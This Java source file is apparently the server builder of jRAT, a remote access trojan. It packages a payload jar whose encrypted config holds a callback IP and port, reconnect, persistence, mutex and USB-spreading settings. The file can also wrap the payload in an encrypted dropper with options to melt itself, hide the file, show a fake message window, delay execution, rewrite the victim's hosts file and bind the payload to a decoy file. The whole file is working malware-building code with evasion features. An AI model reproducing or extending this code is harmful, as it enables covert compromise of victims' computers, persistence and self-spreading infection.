package com.redpois0n.build;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Random;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import org.jrat.project.api.JarUtil;

import com.redpois0n.BuildStatus;
import com.redpois0n.ErrorDialog;
import com.redpois0n.Main;
import com.redpois0n.OSConfig;
import com.redpois0n.common.codec.Base64;
import com.redpois0n.common.codec.Hex;
import com.redpois0n.common.codec.Md5;
import com.redpois0n.common.codec.Sha1;
import com.redpois0n.common.crypto.Crypto;
import com.redpois0n.crypto.FileCrypter;
import com.redpois0n.io.Files;
import com.redpois0n.listeners.BuildListener;
import com.redpois0n.plugins.ExternalPlugin;
import com.redpois0n.plugins.PluginList;
import com.redpois0n.ui.frames.FrameSummary;

public class Build {

	public static void copy(InputStream input, OutputStream output) throws Exception {
		byte[] buffer = new byte[1024];
		int bytesRead;
		while ((bytesRead = input.read(buffer)) != -1) {
			output.write(buffer, 0, bytesRead);
		}
	}

	@SuppressWarnings("resource")
	public static void build(BuildListener listener, File buildFrom, File file, String ip, int port, String ID, String pass, String key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean usb, String usbexclude, String usbname, boolean debugmsg, OSConfig osconfig, boolean summary) {		
		listener.start();
		
		if (!file.getName().toLowerCase().endsWith(".jar")) {
			file = new File(file.getAbsolutePath() + ".jar");
		}
		
		ZipFile inputStub = null;
		ZipOutputStream outputStub = null;
		ZipEntry entry = null;

		listener.reportProgress(5, "Preparing...", BuildStatus.INFO);

		File tempStubCleanJar = null;
		File tempCryptedNotRunnableJar = null;

		try {
			tempStubCleanJar = File.createTempFile("jRAT-Builder-Temp" + (new Random()).nextInt(), ".jar");
			tempCryptedNotRunnableJar = File.createTempFile("jRAT-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
			long start = System.currentTimeMillis();

			inputStub = new ZipFile(buildFrom);

			outputStub = new ZipOutputStream(new FileOutputStream(dropper ? tempStubCleanJar : file));

			Enumeration<? extends ZipEntry> entries = inputStub.entries();
			while (entries.hasMoreElements()) {
				entry = entries.nextElement();
				listener.reportProgress(25, "Writing " + entry.getName(), BuildStatus.INFO);
				outputStub.putNextEntry(entry);
				if (!entry.isDirectory()) {
					copy(inputStub.getInputStream(entry), outputStub);
				}
				outputStub.closeEntry();
				listener.reportProgress(50, "Wrote " + entry.getName(), BuildStatus.CHECK);
			}

			listener.reportProgress(30, "Writing config", BuildStatus.INFO);
			
			
			try {
				entry = new ZipEntry("config.dat");
				outputStub.putNextEntry(entry);

				HashMap<String, Object> config = new HashMap<String, Object>();

				config.put("ip", ip);
				config.put("port", port);
				config.put("id", ID);
				config.put("pass", pass);
				config.put("reconsec", reconSec);
				config.put("name", name);
				config.put("mutex", mutex);
				config.put("mport", mutexport);
				config.put("os", OSConfig.generateString(osconfig));
				config.put("timeout", timeout);
				config.put("toms", timeoutms);
				config.put("ti", trayicon);
				config.put("error", handleerr);
				config.put("per", persistance);
				config.put("perms", persistancems);
				config.put("debugmsg", debugmsg);

				if (trayicon) {
					config.put("tititle", "");
					config.put("timsg", traymsg);
					config.put("timsgfail", traymsgfail);
					config.put("tititle", traytitle);
				}

				if (usb) {
					config.put("usb", usb);
					config.put("usbname", usbname);
					config.put("usbexclude", usbexclude);
				}

				for (String str : config.keySet()) {
					outputStub.write(Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key));
				}

				outputStub.closeEntry();
			} catch (Exception ex) {
				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
					listener.reportProgress(30, "Skipped config.dat, already exists.", BuildStatus.ERROR);
				} else {
					throw ex;
				}
			}
			

			if (trayicon) {
				InputStream trayIcon = null;

				if (icon.equals("default")) {
					trayIcon = Main.class.getResourceAsStream("/icons/icon.png");
				} else {
					trayIcon = new FileInputStream(icon);
				}

				entry = new ZipEntry("icon.png");
				outputStub.putNextEntry(entry);
				copy(trayIcon, outputStub);
				outputStub.closeEntry();
			}

			try {
				entry = new ZipEntry("key.dat");
				outputStub.putNextEntry(entry);
				outputStub.write(key.getBytes());
				outputStub.closeEntry();
			} catch (Exception ex) {
				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
					listener.reportProgress(30, "Skipped key.dat, already exists.", BuildStatus.ERROR);
				} else {
					throw ex;
				}
			}

			
			String[] plugins = null;
			
			if (pluginlist != null) {			
				plugins = new String[pluginlist.plugins.size()];
				listener.reportProgress(50, "Writing plugins...", BuildStatus.INFO);
				
				for (int i = 0; i < pluginlist.plugins.size(); i++) {
					ExternalPlugin p = pluginlist.plugins.get(i);
					JarFile plugin = new JarFile(p.path);
					entries = plugin.entries();
					
					while (entries.hasMoreElements()) {
						entry = entries.nextElement();

						String mainClass = JarUtil.getMainClassFromInfo(plugin);

						if (entry.getName().replace("/", ".").replace(".class", "").equals(mainClass)) {
							plugins[i] = entry.getName().replace("/", ".").replace(".class", "");
						}

						try {
							listener.reportProgress(50, "Writing plugin resource " + entry.getName(), BuildStatus.INFO);
							outputStub.putNextEntry(entry);
							copy(plugin.getInputStream(entry), outputStub);
							outputStub.closeEntry();
							listener.reportProgress(50, "Wrote plugin resource " + entry.getName(), BuildStatus.CHECK);
						} catch (Exception ex) {
							listener.reportProgress(50, ex.getMessage(), BuildStatus.ERROR);
							continue;
						}
					}
					listener.reportProgress(50, "Wrote plugins", BuildStatus.CHECK);
				}
			}

			if (plugins != null) {
				entry = new ZipEntry("plugins.dat");
				outputStub.putNextEntry(entry);
				for (int i = 0; i < plugins.length; i++) {
					outputStub.write((Crypto.encrypt(plugins[i], key) + ",").getBytes());
				}
				outputStub.closeEntry();
			}

			inputStub.close();
			outputStub.close();	

			if (dropper) {
				listener.reportProgress(50, "Writing server into dropper", BuildStatus.INFO);
				String installerKey = key; 
				
				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);

				inputStub = new ZipFile(Files.getInstaller());
				outputStub = new ZipOutputStream(new FileOutputStream(file));

				entries = inputStub.entries();
				while (entries.hasMoreElements()) {
					entry = entries.nextElement();
					outputStub.putNextEntry(entry);
					if (!entry.isDirectory()) {
						copy(inputStub.getInputStream(entry), outputStub);
					}
					outputStub.closeEntry();
				}

				if (edithost) {
					entry = new ZipEntry("host.dat");
					outputStub.putNextEntry(entry);
					outputStub.write(encode(overwritehost + "\n"));
					outputStub.write(encode(hosttext));
					outputStub.closeEntry();
				}

				entry = new ZipEntry("enc.dat");
				
				outputStub.putNextEntry(entry);
				copy(new FileInputStream(tempCryptedNotRunnableJar), outputStub);
				outputStub.closeEntry();
				
				entry = new ZipEntry("key.dat");
		
				outputStub.putNextEntry(entry);								
				
				outputStub.write(encodeLine(installerKey));
				outputStub.write(encodeLine(droppath));
				outputStub.write(encodeLine(name));
				outputStub.write(encodeLine(melt));
				outputStub.write(encodeLine(fakewindow));
				outputStub.write(encodeLine(fakemessage));
				outputStub.write(encodeLine(faketitle));
				outputStub.write(encodeLine(fakeicon));
				outputStub.write(encodeLine(delay));
				outputStub.write(encodeLine(delayms));
				outputStub.write(encodeLine(hiddenFile));

				outputStub.closeEntry();
				
				listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);
				
				
				
				if (bind) {
					File bindFile = new File(bindpath);
					entry = new ZipEntry(bindFile.getName());
					outputStub.putNextEntry(entry);
					FileInputStream fis = new FileInputStream(bindpath);
					copy(fis, outputStub);
					outputStub.closeEntry();
					fis.close();

					listener.reportProgress(90, "Writing file to bind", BuildStatus.INFO);

					entry = new ZipEntry("bind.dat");
					outputStub.putNextEntry(entry);
					outputStub.write((Hex.encode(droptarget) + "\n").getBytes());
					outputStub.write((Hex.encode(bindname) + "\n").getBytes());
					outputStub.write((Hex.encode(bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length())) + "\n").getBytes());
					outputStub.write((Hex.encode(bindFile.getName()) + "\n").getBytes());
					outputStub.closeEntry();
					
					listener.reportProgress(90, "Wrote file to bind", BuildStatus.CHECK);

				}
				inputStub.close();
				outputStub.close();
			}

			long end = System.currentTimeMillis();
			
			listener.reportProgress(95, "MD5 of file: " + Md5.md5(file), BuildStatus.INFO);
			listener.reportProgress(95, "SHA1 of file: " + Sha1.sha1(file), BuildStatus.INFO);
			
			listener.done("Saved Server. Took " + (end - start) + " ms, size " + (file.length() / 1024L) + " kB");
			
			FrameSummary frame = new FrameSummary(file, ip, port, pass, key, ID, listener.getStatuses());
			frame.setVisible(true);
		} catch (Exception ex) {
			String message = ex.getMessage();
			if (message == null) {
				message = "Failed building server";
			}
			try {
				outputStub.close();
				inputStub.close();
			} catch (Exception ex1) {
			}
			
			ex.printStackTrace();
			listener.fail(message);
			ErrorDialog.create(ex);
		}
		
		try {
			tempCryptedNotRunnableJar.delete();
			tempStubCleanJar.delete();
		} catch (Exception ex1) {
			ex1.printStackTrace();
		}
	}
	
	public static byte[] encode(String s) throws Exception {
		s = Hex.encode(s);
		s = Base64.encode(s);
		return s.getBytes();
	}
	
	public static byte[] encodeLine(Object obj) throws Exception {
		return (new String(encode(obj.toString())) + ",").getBytes();
	}

	
}
